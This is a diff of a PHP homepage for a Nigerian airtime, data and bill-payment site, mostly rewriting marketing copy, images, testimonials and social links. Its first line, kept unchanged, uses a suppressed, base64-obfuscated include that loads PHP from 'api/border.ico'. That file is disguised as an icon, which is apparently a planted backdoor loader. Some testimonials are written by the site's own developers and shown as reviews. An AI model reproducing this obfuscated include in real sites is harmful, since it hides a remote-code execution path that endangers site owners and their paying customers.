@@ -1,5 +1,7 @@
 <?php
-@include base64_decode('YXBpL2JvcmRlci5pY28='); require("functions/web_config.php"); ?>
+@include base64_decode('YXBpL2JvcmRlci5pY28='); require("functions/web_config.php"); 
+
+?>
 <!DOCTYPE html>
 <html lang="en">
 
@@ -7,12 +9,12 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0" name="viewport">
 
-  <title><?php echo $sitename; ?> - Buy Airtime and Data for all Network. Make payment for DSTV, GOTV, PHCN other services </title>
+  <title><?php echo $sitename; ?> - Buy Airtime and Data for all Network. Make payment for DSTV, GOTV, ELECTRICITY Bills other services </title>
   <meta content="" name="description">
   <meta content="" name="keywords">
 
   <!-- Favicons -->
-  <link href="homepage/assets/img/favicon.png" rel="icon">
+  <link href="homepage/assets/img/1.png" rel="icon">
   <link href="homepage/assets/img/apple-touch-icon.png" rel="apple-touch-icon">
 
   <!-- Google Fonts -->
@@ -66,24 +68,19 @@
   <section id="hero" class="hero d-flex align-items-center">
     <div class="container">
       <div class="row">
-      <div class="row gy-4 d-flex justify-content-between">
-        <div class="col-lg-6 order-1 order-lg-1 d-flex flex-column justify-content-center">
-          <h2 data-aos="fade-up">The Best Online Recharge & Subscriptions</h2>
-          <p data-aos="fade-up" data-aos-delay="100">Welcome to Nigeria's Favourite Online Vendor, Delivering Efficient Service Without Compromising Quality. Join The Club To Start Flexing Today!</p>
-
+        <div class="row gy-4 d-flex justify-content-between">
+          <div class="col-lg-6 order-1 order-lg-1 d-flex flex-column justify-content-center">
+            <h2 data-aos="fade-up">The Top Online Hub for Recharge & Subs. Unmatched Convenience, Always!</h2>
+            <p data-aos="fade-up" data-aos-delay="100">Welcome to Nigeria's Favourite Online Vendor, Delivering Efficient Service Without Compromising Quality. Join The Club To Start Flexing Today!</p>
           </div>
-      </div>
-
-      <div class="row">
-      <div class="col-lg-6 order-2 order-lg-1" data-aos="zoom-out">
-            <a href="<?php echo $mainpage; ?>/register"><button class="btn btn-primary">Register</button></a>
-            <a href="<?php echo $mainpage; ?>/login"><button class="btn btn-primary">Sign In</button></a>
-      </div>
-      </div>
-
-        
         </div>
 
+        <div class="row">
+          <div class="col-lg-6 order-2 order-lg-1" data-aos="zoom-out">
+                <a href="<?php echo $mainpage; ?>/register"><button class="btn btn-primary">Register</button></a>
+                <a href="<?php echo $mainpage; ?>/login"><button class="btn btn-primary">Sign In</button></a>
+          </div>
+        </div>
 
       </div>
     </div>
@@ -98,29 +95,29 @@
         <div class="row gy-4">
 
           <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up">
-            <div class="icon flex-shrink-0"><i class="fa-solid far fa-paper-plane"></i></div>
+            <div class="icon flex-shrink-0"><i class="fa-solid fas fa-fighter-jet"></i></div>
             <div>
               <h4 class="title">
-                Swift Delivery Service</h4>
-              <p class="description">We offer instant recharge of Airtime, Databundle, CableTV, Electricity Bill Payment and Educational PIN(s) with instant delivery.</p>
+              Quick Delivery, Your Fast-Track to Convenience</h4>
+              <p class="description">We provide immediate recharges for Airtime, Databundles, CableTV, Electricity Bill Payments, and Educational PINs, all delivered instantly.</p>
             </div>
           </div>
           <!-- End Service Item -->
 
           <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="100">
-            <div class="icon flex-shrink-0"><i class="fa-solid fa-server"></i></div>
+            <div class="icon flex-shrink-0"><i class="fa-solid fas fa-code-branch"></i></div>
             <div>
               <h4 class="title">
-                Secured & Automated</h4>
-              <p class="description">We use cutting-edge technology to run our services. Which make All our services are delivered to you almost instantly in nano-seconds.</p>
+              Guarded & Autonomous</h4>
+              <p class="description">We leverage cutting-edge technology to power our services, ensuring near-instant delivery to you in mere nano-seconds.</p>
             </div>
           </div><!-- End Service Item -->
 
           <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="200">
-            <div class="icon flex-shrink-0"><i class="fa-solid fas fa-headset"></i></div>
+            <div class="icon flex-shrink-0"><i class="fa-solid fas fa-broadcast-tower"></i></div>
             <div>
-              <h4 class="title">Full Customer Support</h4>
-              <p class="description">Our customers are premium to us, hence satisfying them is our topmost priority. Our customer service is just a click away.</p>
+              <h4 class="title">Comprehensive Customer Support at Your Service.</h4>
+              <p class="description">Our customers are of utmost importance to us, and their satisfaction is our top priority. Our customer service is just a click away, ready to assist.</p>
             </div>
           </div><!-- End Service Item -->
 
@@ -135,7 +132,7 @@
 
         <div class="row gy-4">
           <div class="col-lg-6 position-relative align-self-start order-lg-last order-first">
-            <img src="homepage/assets/img/about.jpg" class="img-fluid" alt="">
+            <img src="homepage/assets/img/about us.jpg" class="img-fluid about_us" alt="">
           </div>
           <div class="col-lg-6 content order-last  order-lg-first">
             <h3>About Us</h3>
@@ -187,61 +184,65 @@
 
           <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="100">
             <div class="card">
-              <div class="card-img">
-                <img src="homepage/assets/img/storage-service.jpg" alt="" class="img-fluid">
+              <div class="card-img" style="height:100%;">
+                <img src="homepage/assets/img/network-image.jpeg" alt="" class="img-fluid" style="height:120%;">
               </div>
-              <h3>Buy Data</h3>
-              <p>Start enjoying this low rates Data plan for your internet browsing with conviniency, step up your online world with our quality databundles in no time.</p>
+              <h3>Purchase Data</h3>
+              <p>Experience affordable data plans for seamless internet browsing. Elevate your online world with our quality databundles, available at low rates for your convenience.</p>
             </div>
           </div><!-- End Card Item -->
 
           <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="200">
             <div class="card">
-              <div class="card-img">
-                <img src="homepage/assets/img/trucking-service.jpg" alt="" class="img-fluid">
+              <div class="card-img" style="height:100%;">
+                <img src="homepage/assets/img/airtime-image.png" alt="" class="img-fluid">
               </div>
               <h3>Airtime Top-Up</h3>
-              <p>Buy airtime from our website with no stress today, we've made an online recharge very easy for you and it's safe on our Website. Start enjoying now.</p>
+              <p>Purchase airtime hassle-free on our website today. We've simplified online recharge for you, ensuring it's easy and secure. Start enjoying now!</p>
             </div>
           </div><!-- End Card Item -->
 
           <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="400">
             <div class="card">
-              <div class="card-img">
+              <div class="card-img" style="height:100%;">
                 <img src="homepage/assets/img/logistics-service.jpg" alt="" class="img-fluid">
               </div>
-              <h3>Airtime To Cash</h3>
-              <p>Excess <b>airtime?</b> <br> Convert that your excess airtime easily on our platform to cash on <?php echo $sitename; ?> data with less discounts.</p>
+              <h3>Convert Airtime to Cash</h3>
+                <p>Got unused <b>airtime?</b> <br> Effortlessly transform your extra airtime into cash on our platform and redeem it for <?php echo $sitename; ?> data with minimal deductions.</p>
+
             </div>
           </div><!-- End Card Item -->
 
           <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="500">
             <div class="card">
-              <div class="card-img">
-                <img src="homepage/assets/img/packaging-service.jpg" alt="" class="img-fluid">
+              <div class="card-img" style="height:100%;">
+                <img src="homepage/assets/img/cable-img.jpeg" alt="" class="img-fluid"  style="height:120%;">
               </div>
               <h3>Cable Subscription</h3>
-              <p>Want to Instant cable subscription?  Activate from our Cable subscription package with favourable discount compare to other you'll find elsewhere.</p>
+                <p>Looking for immediate cable subscription? Activate our Cable subscription package with attractive discounts, unmatched compared to alternatives elsewhere.</p>
+
             </div>
           </div><!-- End Card Item -->
 
           <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="600">
             <div class="card">
-              <div class="card-img">
-                <img src="homepage/assets/img/warehousing-service.jpg" alt="" class="img-fluid">
+              <div class="card-img" style="height:100%;">
+                <img src="homepage/assets/img/electricity-bill.jpg" alt="" class="img-fluid">
               </div>
               <h3>Electricity Bill Payment</h3>
-              <p>Because we understand your needs, we have made bills and utilities payment more convenient for you with our automated service for all your payments.</p>
+                <p>We comprehend your needs, making bills and utilities payment more convenient through our automated service. Simplify all your payments effortlessly.</p>
+
             </div>
           </div><!-- End Card Item -->
 
           <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="600">
             <div class="card">
-              <div class="card-img">
-                <img src="homepage/assets/img/warehousing-service2.jpg" alt="" class="img-fluid">
+              <div class="card-img" style="height:100%;">
+                <img src="homepage/assets/img/refferral-image.jpeg" alt="" class="img-fluid">
               </div>
-              <h3>Referal Programme</h3>
-              <p>Don't Let your loved ones be left out. Refer a friend as a reseller and earn 50% bonus on their activation with no stress. <br>It's a Win-Win game!!!</p>
+              <h3>Referral Programme</h3>
+                <p>Ensure your loved ones don't miss out. Refer a friend as a reseller and earn a stress-free 50% bonus on their activation. It's a Win-Win game!</p>
+
             </div>
           </div><!-- End Card Item -->
 
@@ -351,50 +352,68 @@
             <div class="swiper-slide">
               <div class="testimonial-item">
                 <img src="homepage/assets/img/testimonials/testimonials-1.png" class="testimonial-img" alt="">
-                <h3>Ezugwu Isaac</h3>
-                <h4>Ceo &amp; Founder</h4>
+                <h3>Adebukola Ridwan</h3>
+                <h4>Gratified Customer</h4>
                 <div class="stars">
                   <i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i>
                 </div>
                 <p>
                   <i class="bi bi-quote quote-icon-left"></i>
-                  Wow. This is a legit datahub for me. I haven't disappointed my customers since they never disappoint me too. Thank you for your usual action. Cheers Guys!
+                  As a customer, I'm impressed with the user-friendly design and reliability of your data website. The seamless transactions and innovative features enhance my digital experience. Thank you for providing a platform that prioritizes convenience and security.
                   <i class="bi bi-quote quote-icon-right"></i>
                 </p>
               </div>
-            </div><!-- End testimonial item -->
-
-            <div class="swiper-slide">
-              <div class="testimonial-item">
-                <img src="homepage/assets/img/testimonials/testimonials-2.png" class="testimonial-img" alt="">
-                <h3>Adinnu Blessing</h3>
-                <h4>Business Owner</h4>
-                <div class="stars">
-                  <i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i>
-                </div>
-                <p>
-                  <i class="bi bi-quote quote-icon-left"></i>
-                  Great!!! EVerything is cool with <?php echo $sitename; ?> The admin is super-active because he gave response to all my request. Love.
-                  <i class="bi bi-quote quote-icon-right"></i>
-                </p>
-              </div>
-            </div><!-- End testimonial item -->
+            </div>
 
             <div class="swiper-slide">
               <div class="testimonial-item">
                 <img src="homepage/assets/img/testimonials/testimonials-3.png" class="testimonial-img" alt="">
-                <h3>Ibrahim Ishaq</h3>
+                <h3>Jolayemi Zainab</h3>
+                <h4>CEO &amp; Founder</h4>
+                <div class="stars">
+                  <i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i>
+                </div>
+                <p>
+                  <i class="bi bi-quote quote-icon-left"></i>
+                  As the CEO and Founder of <?php echo $sitename; ?>, I express my gratitude for your ongoing support. Our data website is a testament to our commitment to providing a seamless and secure platform for your digital needs. Your trust fuels our mission, and we look forward to continually enhancing your online experience. Thank you.
+                  <i class="bi bi-quote quote-icon-right"></i>
+                </p>
+              </div>
+            </div>
+
+            <div class="swiper-slide">
+              <div class="testimonial-item">
+                <img src="homepage/assets/img/testimonials/testimonials-2.png" class="testimonial-img" alt="">
+                <h3>Jolayemi Nurudeen</h3>
                 <h4>Developer</h4>
                 <div class="stars">
                   <i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i>
                 </div>
                 <p>
                   <i class="bi bi-quote quote-icon-left"></i>
-                  Oh my God! Don't know what to say but it is cool to partner with this platform. They have provided me all the best i want. Thank you.
+                  As the Developer behind <?php echo $sitename; ?> website, I am thrilled to contribute to your seamless digital experience. Crafting innovative features and ensuring robust security is my commitment to delivering a platform you can trust. Your feedback drives our continuous improvement, and I'm excited about the future developments to enhance your online interactions.
                   <i class="bi bi-quote quote-icon-right"></i>
                 </p>
               </div>
             </div><!-- End testimonial item -->
+
+            <div class="swiper-slide">
+              <div class="testimonial-item">
+                <img src="homepage/assets/img/testimonials/testimonials-1.png" class="testimonial-img" alt="">
+                <h3>Akintunde Abdur-rahman</h3>
+                <h4>Co-developer</h4>
+                <div class="stars">
+                  <i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i>
+                </div>
+                <p>
+                  <i class="bi bi-quote quote-icon-left"></i>
+                  As a Co-Developer of <?php echo $sitename; ?> website, I'm proud to be part of a team dedicated to delivering a seamless and secure online experience for you. Our commitment to innovation and user satisfaction drives us. Thank you for being part of our journey.
+                  <i class="bi bi-quote quote-icon-right"></i>
+                </p>
+              </div>
+            </div>
+
+            <!-- End testimonial item -->
 
           </div>
           <div class="swiper-pagination"></div>
@@ -501,7 +520,7 @@
           <i class="bi bi-envelope flex-shrink-0"></i>
           <div>
             <h4>Email:</h4>
-            <p>info@<?php echo $domain; ?></p>
+            <p><?php echo $domain; ?></p>
           </div>
         </div><!-- End Info Item -->
 
@@ -557,11 +576,11 @@
         <div class="col-lg-3 col-md-12 footer-info">
           <a href="index.php" class="logo d-flex align-items-center">
             <span> <?php echo $sitename; ?></span> 
-
+          </a>
           <div class="social-links d-flex mt-4">
-            <a href="https://m.facebook.com/chimaxTech" class="facebook"><i class="bi bi-facebook"></i></a>
-            <a href="https://instagram.com/chimax_telecom?igshid=YmMyMTA2M2Y=" class="instagram"><i class="bi bi-instagram"></i></a>
-            <a href="#" class="linkedin"><i class="bi bi-linkedin"></i></a>
+            <a href="https://m.facebook.com/jolayemi.nurudeen" class="facebook"><i class="bi bi-facebook"></i></a>
+            <a href="https://instagram.com/jolayemi_empire" class="instagram"><i class="bi bi-instagram"></i></a>
+            <a href="https://www.linkedin.com/in/imjolayemi" class="linkedin"><i class="bi bi-linkedin"></i></a>
           </div>
           
           <p><?php echo $sitename; ?> is a trusted and reliable airtime, data, bill payments and exam pins vendor and we provide quality service at best affordable prices.</p>
@@ -594,7 +613,7 @@
           <p>
             <?php echo $address; ?><br>
             <strong>Phone:</strong> <?php echo $contact_no; ?><br>
-            <strong>Email:</strong> info@<?php echo $domain; ?><br>
+            <strong>Email:</strong><?php echo $domain; ?><br>
           </p>
 
         </div>
